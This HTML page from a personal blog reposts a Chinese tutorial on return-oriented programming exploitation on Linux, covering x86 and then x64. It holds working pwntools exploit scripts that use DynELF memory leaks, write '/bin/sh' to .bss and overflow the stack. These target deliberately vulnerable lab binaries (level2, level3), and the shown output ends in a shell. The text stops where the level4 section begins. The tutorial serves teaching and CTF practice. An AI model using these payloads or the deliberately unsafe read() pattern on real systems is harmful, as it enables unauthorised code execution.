<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Lee's Blog | Lee's Blog</title><meta name="author" content="VxerLee"><meta name="copyright" content="VxerLee"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="一步一步学ROP之linux_x64篇(蒸米spark)0x00 序ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。上次我们主要讨论了linux_x86的ROP攻击。 一步一步学ROP之linux_x86篇 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Vxer">
<meta property="og:type" content="article">
<meta property="og:title" content="Lee&#39;s Blog">
<meta property="og:url" content="https://vxer-lee.github.io/2021/10/20/PWN/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87(%E8%92%B8%E7%B1%B3spark)/index.html">
<meta property="og:site_name" content="Lee&#39;s Blog">
<meta property="og:description" content="一步一步学ROP之linux_x64篇(蒸米spark)0x00 序ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。上次我们主要讨论了linux_x86的ROP攻击。 一步一步学ROP之linux_x86篇 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Vxer">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2021-10-20T08:19:18.340Z">
<meta property="article:modified_time" content="2021-10-20T09:00:17.000Z">
<meta property="article:author" content="VxerLee">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/gh0st.ico"><link rel="canonical" href="https://vxer-lee.github.io/2021/10/20/PWN/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87(%E8%92%B8%E7%B1%B3spark)/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Lee\'s Blog',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-10-20 17:00:17'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Lee's Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/lee.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Lee's Blog</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-10-20T08:19:18.340Z" title="发表于 2021-10-20 16:19:18">2021-10-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-10-20T09:00:17.000Z" title="更新于 2021-10-20 17:00:17">2021-10-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="一步一步学ROP之linux-x64篇-蒸米spark"><a href="#一步一步学ROP之linux-x64篇-蒸米spark" class="headerlink" title="一步一步学ROP之linux_x64篇(蒸米spark)"></a>一步一步学ROP之linux_x64篇(蒸米spark)</h1><h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。上次我们主要讨论了linux_x86的ROP攻击。</p>
<p>一步一步学ROP之linux_x86篇 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/VxerLee/p/15424336.html">https://www.cnblogs.com/VxerLee/p/15424336.html</a></p>
<p>在这次的教程中我们会带来上一篇的补充以及linux_x64方面的ROP利用方法，欢迎大家继续学习。</p>
<p>另外文中涉及代码可在我的github下载：<a target="_blank" rel="noopener" href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP">https://github.com/zhengmin1989/ROP_STEP_BY_STEP</a></p>
<h2 id="0x01-Memory-Leak-amp-DynELF-在不获取目标libc-so的情况下进行ROP攻击"><a href="#0x01-Memory-Leak-amp-DynELF-在不获取目标libc-so的情况下进行ROP攻击" class="headerlink" title="0x01 Memory Leak &amp; DynELF - 在不获取目标libc.so的情况下进行ROP攻击"></a>0x01 Memory Leak &amp; DynELF - 在不获取目标libc.so的情况下进行ROP攻击</h2><p>注意，这一节是上一篇文章的补充，还是讲的x86的ROP。上次讲到了如何通过ROP绕过x86下DEP和ASLR防护。但是我们要事先得到目标机器上的libc.so或者具体的linux版本号才能计算出相应的offset。那么如果我们在获取不到目标机器上的libc.so情况下，应该如何做呢？这时候就需要通过<code>memory leak(内存泄露)</code>来搜索内存找到system()的地址。</p>
<p>这里我们采用pwntools提供的<code>DynELF</code>模块来进行内存搜索。首先我们需要实现一个leak(address)函数，通过这个函数可以获取到某个地址上最少1 byte的数据。拿我们上一篇中的level2程序举例。leak函数应该是这样实现的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
<p>随后将这个函数作为参数再调用<code>d = DynELF(leak, elf=ELF(&#39;./level2&#39;))</code>就可以对DynELF模块进行初始化了。然后可以通过调用<code>system_addr = d.lookup(&#39;system&#39;, &#39;libc&#39;)</code>来得到libc.so中system()在内存中的地址。</p>
<p>要注意的是，通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S level2</span><br><span class="line">There are 30 section headers, starting at offset 0x1148:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">……</span><br><span class="line">  [23] .got.plt          PROGBITS        08049ff4 000ff4 000024 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          0804a020 001020 000008 00  WA  0   0  4</span><br><span class="line">  [26] .comment          PROGBITS        00000000 001020 00002a 01  MS  0   0  1</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>因为我们在执行完read()之后要接着调用<code>system(“/bin/sh”)</code>，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。(PS：我们会在随后的章节中介绍如何用工具寻找更复杂的gadgets。)</p>
<p>整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用<code>system（.bss）</code>，执行“/bin/sh”。最终的exp如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt_read = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x08048474</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;, 10002)</span></span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&#x27;./level2&#x27;</span>))</span><br><span class="line"></span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_addr=&quot;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804a020</span></span><br><span class="line">pppr = <span class="number">0x804855d</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span>  + p32(plt_read) + p32(pppr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>) </span><br><span class="line">payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)</span><br><span class="line"><span class="comment">#ss = raw_input()</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n###sending payload2 ...###&quot;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">$ python exp4.py </span><br><span class="line">[+] Started program <span class="string">&#x27;./level2&#x27;</span></span><br><span class="line">0x8048000 =&gt; 7f454c46</span><br><span class="line">[+] Loading from <span class="string">&#x27;/home/mzheng/CTF/level2&#x27;</span>: Done</span><br><span class="line">0x8049ff8 =&gt; 18697eb7</span><br><span class="line">[+] Resolving <span class="string">&#x27;system&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;libc.so&#x27;</span>: 0xb77e6918</span><br><span class="line">0x8049f28 =&gt; 01000000</span><br><span class="line">0x8049f30 =&gt; 0c000000</span><br><span class="line">0x8049f38 =&gt; 0d000000</span><br><span class="line">0x8049f40 =&gt; f5feff6f</span><br><span class="line">0x8049f48 =&gt; 05000000</span><br><span class="line">0x8049f50 =&gt; 06000000</span><br><span class="line">0x8049f58 =&gt; 0a000000</span><br><span class="line">0x8049f60 =&gt; 0b000000</span><br><span class="line">0x8049f68 =&gt; 15000000</span><br><span class="line">0x8049f70 =&gt; 03000000</span><br><span class="line">0x8049f74 =&gt; f49f0408</span><br><span class="line">0xb77e691c =&gt; c5eb7db7</span><br><span class="line">0xb77debc5 =&gt; 0069203d</span><br><span class="line">0xb77e6924 =&gt; 086c7eb7</span><br><span class="line">0xb77e6c0c =&gt; c5eb7db7</span><br><span class="line">0xb77e6c14 =&gt; 58387cb7</span><br><span class="line">0xb77c385c =&gt; 38387cb7</span><br><span class="line">0xb77c3838 =&gt; 2f6c6962</span><br><span class="line">0xb77c383c =&gt; 2f693338</span><br><span class="line">0xb77c3840 =&gt; 362d6c69</span><br><span class="line">0xb77c3844 =&gt; 6e75782d</span><br><span class="line">0xb77c3848 =&gt; 676e752f</span><br><span class="line">0xb77c384c =&gt; 6c696263</span><br><span class="line">0xb77c3850 =&gt; 2e736f2e</span><br><span class="line">0xb77c3854 =&gt; 36000000</span><br><span class="line">0xb77c3858 =&gt; 007060b7</span><br><span class="line">0xb7607000 =&gt; 7f454c46</span><br><span class="line">0xb77c3860 =&gt; 7cdd7ab7</span><br><span class="line">0xb7607004 =&gt; 01010100</span><br><span class="line">0xb77add7c =&gt; 01000000</span><br><span class="line">0xb77add84 =&gt; 0e000000</span><br><span class="line">0xb77add8c =&gt; 0c000000</span><br><span class="line">0xb77add94 =&gt; 19000000</span><br><span class="line">0xb77add9c =&gt; 1b000000</span><br><span class="line">0xb77adda4 =&gt; 04000000</span><br><span class="line">0xb77addac =&gt; f5feff6f</span><br><span class="line">0xb77addb0 =&gt; b87160b7</span><br><span class="line">0xb77addb4 =&gt; 05000000</span><br><span class="line">0xb77addb8 =&gt; 584161b7</span><br><span class="line">0xb77addbc =&gt; 06000000</span><br><span class="line">0xb77addc0 =&gt; 38ae60b7</span><br><span class="line">0xb76071b8 =&gt; f3030000</span><br><span class="line">0xb76071bc =&gt; 09000000</span><br><span class="line">0xb76071c0 =&gt; 00020000</span><br><span class="line">0xb7608390 =&gt; 8e050000</span><br><span class="line">0xb7609fa8 =&gt; 8ae4ee1c</span><br><span class="line">0xb7610718 =&gt; 562f0000</span><br><span class="line">0xb76170ae =&gt; 73797374</span><br><span class="line">0xb76170b2 =&gt; 656d0074</span><br><span class="line">0xb761071c =&gt; 60f40300</span><br><span class="line">system_addr=0xb7646460</span><br><span class="line"></span><br><span class="line"><span class="comment">###sending payload2 ...###</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">mzheng</span><br></pre></td></tr></table></figure>

<h2 id="0x02-linux-64与linux-86的区别"><a href="#0x02-linux-64与linux-86的区别" class="headerlink" title="0x02 linux_64与linux_86的区别"></a>0x02 linux_64与linux_86的区别</h2><p>linux_64与linux_86的区别主要有两点：</p>
<ul>
<li>内存地址的范围由32位变成了64位。</li>
<li>参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中。</li>
</ul>
<p>首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。</p>
<p>我们还是拿实际程序做例子进行讲解,level3.c内容如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">write</span>(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    <span class="built_in">vulnerable_function</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们打开ASLR并用如下方法编译：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -fno-stack-protector level3.c -o level3</span><br></pre></td></tr></table></figure>

<p>通过分析源码，我们可以看到想要获取这个程序的shell非常简单，只需要控制PC指针跳转到callsystem()这个函数的地址上即可。因为程序本身在内存中的地址不是随机的，所以不用担心函数地址发生改变。接下来就是要找溢出点了。我们还是用老方法生成一串定位字符串：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$python</span> pattern.py create 150 &gt; payload</span><br><span class="line">$ cat payload </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br></pre></td></tr></table></figure>

<p>然后运行<code>gdb ./level3</code>后输入这串字符串造成程序崩溃。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run &lt; payload</span><br><span class="line">Starting program: /home/mzheng/CTF/level3 &lt; payload</span><br><span class="line">Hello, World</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x00000000004005b3 <span class="keyword">in</span> vulnerable_function ()</span><br></pre></td></tr></table></figure>

<p>奇怪的事情发生了，PC指针并没有指向类似于<code>0x41414141</code>那样地址，而是停在了<code>vulnerable_function()</code>函数中。这是为什么呢？原因就是我们之前提到过的程序使用的内存地址不能大于<code>0x00007fffffffffff</code>，否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为ret相当于“pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/gx <span class="variable">$rsp</span></span><br><span class="line">0x7fffffffe188: 0x3765413665413565</span><br></pre></td></tr></table></figure>

<p>在GDB里，x是查看内存的指令，随后的gx代表数值用64位16进制显示。随后我们就可以用pattern.py来计算溢出点。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python pattern.py offset 0x3765413665413565</span><br><span class="line">hex pattern decoded as: e5Ae6Ae7</span><br><span class="line">136</span><br></pre></td></tr></table></figure>

<p>可以看到溢出点为136字节。我们再构造一次payload，并且跳转到一个小于<code>0x00007fffffffffff</code>的地址，看看这次能否控制pc的指针。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;print &quot;A&quot;*136+&quot;ABCDEF\x00\x00&quot;&#x27;</span> &gt; payload</span><br><span class="line"></span><br><span class="line">(gdb) run &lt; payload </span><br><span class="line">Starting program: /home/mzheng/CTF/level1 &lt; payload</span><br><span class="line">Hello, World</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x0000464544434241 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>可以看到我们已经成功的控制了PC的指针了。所以最终的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,10001)</span></span><br><span class="line"></span><br><span class="line">callsystem = <span class="number">0x0000000000400584</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">136</span> + p64(callsystem)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x03使用工具寻找gadgets"><a href="#0x03使用工具寻找gadgets" class="headerlink" title="0x03使用工具寻找gadgets"></a>0x03使用工具寻找gadgets</h2><p>我们之前提到x86中参数都是保存在栈上,但在x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。所以我们需要寻找一些类似于pop rdi; ret的这种gadget。如果是简单的gadgets，我们可以通过objdump来查找。但当我们打算寻找一些复杂的gadgets的时候，还是借助于一些查找gadgets的工具比较方便。比较有名的工具有：<br>ROPEME: <a target="_blank" rel="noopener" href="https://github.com/packz/ropeme">https://github.com/packz/ropeme</a><br>Ropper: <a target="_blank" rel="noopener" href="https://github.com/sashs/Ropper">https://github.com/sashs/Ropper</a><br>ROPgadget:<a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget/tree/master">https://github.com/JonathanSalwan/ROPgadget/tree/master</a><br>rp++: <a target="_blank" rel="noopener" href="https://github.com/0vercl0k/rp">https://github.com/0vercl0k/rp</a><br>one_gadget:<a target="_blank" rel="noopener" href="https://github.com/david942j/one_gadget">https://github.com/david942j/one_gadget</a></p>
<p>这些工具功能上都差不多，找一款自己能用的惯的即可。<br>下面我们结合例子来讲解，首先来看一下目标程序level4.c的源码：</p>
